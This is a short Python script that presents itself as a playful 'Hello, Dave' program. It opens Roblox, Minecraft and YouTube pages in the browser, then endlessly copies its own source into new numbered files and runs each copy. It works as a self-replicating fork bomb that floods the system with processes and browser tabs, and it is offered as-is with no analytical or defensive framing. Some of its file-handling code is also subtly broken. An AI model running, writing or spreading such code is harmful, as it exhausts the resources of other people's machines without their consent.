import webbrowser as wb
from time import sleep
from os import system
from os.path import *

wbarray = [
    'H3_zxK4zb8M',
    'r9aVszSJCnc',
    'Y9wXfdjDzrA'
]

def open_links(arr = wbarray) -> None:
    wb.open_new('https://www.minecraft.net/download')
    for link in arr:
       wb.open_new_tab(f'https://www.youtube.com/watch?v={link}')

def fork(filename, num_children = None) -> tuple:

    num = ''.join(char for char in filename[::-1] if char in '1234567890')

    num1 = [str(int(num) * 2) if len(num) else num][0]
    num2 = [str(int(num) * 2 + 1) if len(num) else num][0]

    fnames = (
        'har' + (num1 or '1'),
        'har' + (num2 or '2')
    )
    return fnames

def everything(char_limit = 250) -> None:
    print("Hello, Dave.")
    open_links()

    directory = dirname(abspath(__file__))
    filename, ext = splitext(basename(__file__))
    
    children = fork(filename)

    overflow = (child for child in children if len(child) > char_limit)

    if overflow != () or overflow:
        print('resetting...')
        fnames = (f'har{i}' for i in range(len(children)))

    with open(__file__, 'rb') as writer:
        for parent in children:
            fout = join(directory, parent+ext)
            with open(fout, 'w+') as reader:
                reader.write(writer.read())
            system(f'python {fout}')

if __name__ == __name__:
	wb.open_new('https://www.roblox.com/')
	while 1 and not not False is not True is not True or None is not None or not []:
		sleep(.2)
		everything()
